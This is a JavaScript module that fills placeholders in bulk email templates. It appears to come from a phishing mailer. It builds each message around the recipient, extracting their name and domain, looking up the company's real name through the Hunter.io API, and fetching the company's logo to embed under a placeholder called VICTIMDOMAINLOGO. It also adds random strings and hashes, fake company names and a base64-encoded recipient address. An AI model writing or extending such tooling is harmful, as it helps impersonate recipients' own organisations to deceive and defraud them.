// placeholders.js
import crypto from 'crypto';

const fakeCompanies = [
  "Global Innovations", "Vertex Solutions", "Nexus Dynamics", "Aether Group",
  "Summit Partners", "Quantum Edge", "Horizon Ventures", "Apex Systems"
];

const logoCache = new Map();
const companyNameCache = new Map();   // New cache for real company names

// ================== CONFIG ==================
// PUT YOUR HUNTER.IO API KEY HERE
const HUNTER_API_KEY = "YOUR_HUNTER_API_KEY_HERE";   // ←←← CHANGE THIS
// ===========================================

async function getLogoBuffer(domain) {
  if (logoCache.has(domain)) return logoCache.get(domain);
  try {
    const response = await fetch(`https://logos.hunter.io/${domain}`);
    if (response.ok) {
      const buffer = Buffer.from(await response.arrayBuffer());
      logoCache.set(domain, buffer);
      return buffer;
    }
  } catch (e) {}
 
  const transparent = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  logoCache.set(domain, transparent);
  return transparent;
}

async function getRealCompanyName(domain) {
  if (!domain || domain === "example.com") return null;
  if (companyNameCache.has(domain)) return companyNameCache.get(domain);

  // Skip if no API key provided
  if (HUNTER_API_KEY === "YOUR_HUNTER_API_KEY_HERE" || !HUNTER_API_KEY) {
    return null;
  }

  try {
    const url = `https://api.hunter.io/v2/companies/find?domain=${encodeURIComponent(domain)}&api_key=${HUNTER_API_KEY}`;
    const response = await fetch(url);
    
    if (response.ok) {
      const data = await response.json();
      const realName = data?.data?.name || data?.data?.legalName;
      
      if (realName) {
        companyNameCache.set(domain, realName);
        console.log(`✅ Real company name found: ${domain} → ${realName}`);
        return realName;
      }
    } else if (response.status === 404) {
      // No data found for this domain
      companyNameCache.set(domain, null);
    }
  } catch (error) {
    console.warn(`⚠️ Hunter API error for ${domain}:`, error.message);
  }

  return null;
}

export async function processAdvancedPlaceholders(content, recipientAddress) {
  if (!content) return content;

  let result = content;
  const emailParts = recipientAddress.split('@');
  const nameRaw = emailParts[0] || "User";
  const domain = emailParts[1] || "example.com";

  const recipientName = nameRaw
    .replace(/[^a-zA-Z0-9]/g, ' ')
    .trim()
    .split(' ')
    .map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase())
    .join(' ');

  const domainClean = domain.split('.')[0]
    .replace(/[^a-zA-Z0-9-]/g, ' ')
    .trim();

  const domainName = domainClean
    .split(' ')
    .map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase())
    .join(' ');

  // === IMPROVED: Get real company name from Hunter.io ===
  let realCompanyName = await getRealCompanyName(domain);
  
  // Fallback to old logic only if Hunter fails or returns nothing
  if (!realCompanyName) {
    realCompanyName = domainName + " Inc.";
  }
  // ======================================================

  const placeholders = {
    RECIPIENT_NAME: recipientName,
    RECIPIENT_EMAIL: recipientAddress,
    RECIPIENT_DOMAIN: domain,
    RECIPIENT_DOMAIN_NAME: domainName,
    RECIPIENT_REAL_COMPANY_NAME: realCompanyName,
    CURRENT_DATE: new Date().toLocaleDateString(),
    CURRENT_TIME: new Date().toLocaleTimeString(),
    RANDOM_NUMBER10: Math.random().toString().slice(2, 12),
    RANDOM_STRING: crypto.randomBytes(16).toString('hex').toUpperCase(),
    RANDOM_MD5: crypto.createHash('md5').update(Math.random().toString()).digest('hex'),
    RECIPIENT_BASE64_EMAIL: Buffer.from(recipientAddress).toString('base64'),
    FAKE_COMPANY: fakeCompanies[Math.floor(Math.random() * fakeCompanies.length)],
    FAKE_COMPANY_EMAIL: `info@${domain.split('.')[0]}.com`,
    VICTIMDOMAINLOGO: `<img src="cid:companylogo" style="max-height:65px; vertical-align:middle;" alt="${domainName} Logo"/>`,
  };

  for (const [key, value] of Object.entries(placeholders)) {
    result = result.replace(new RegExp(`{${key}}`, 'gi'), value || '');
  }

  // Functions
  result = result.replace(/{url\((.*?)\)}/gi, (_, p1) => encodeURIComponent(p1.trim()));
  result = result.replace(/{base64\((.*?)\)}/gi, (_, p1) => Buffer.from(p1.trim()).toString('base64'));
  result = result.replace(/{censor\((.*?)\)}/gi, (_, p1) => p1.trim().replace(/(.{2})(.*)(@.*)/, '$1****$3'));
  result = result.replace(/{random\((.*?)\)}/gi, (_, p1) => {
    const opts = p1.split('|').map(o => o.trim());
    return opts[Math.floor(Math.random() * opts.length)] || '';
  });

  const now = new Date();
  result = result.replace(/{date(\d+)?}/gi, (_, num) => {
    const n = parseInt(num) || 0;
    switch (n) {
      case 8: return now.toLocaleDateString('en-GB');
      case 9: return now.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
      default: return now.toLocaleString();
    }
  });

  return result;
}

export async function getLogoBufferForCID(domain) {
  return await getLogoBuffer(domain);
}
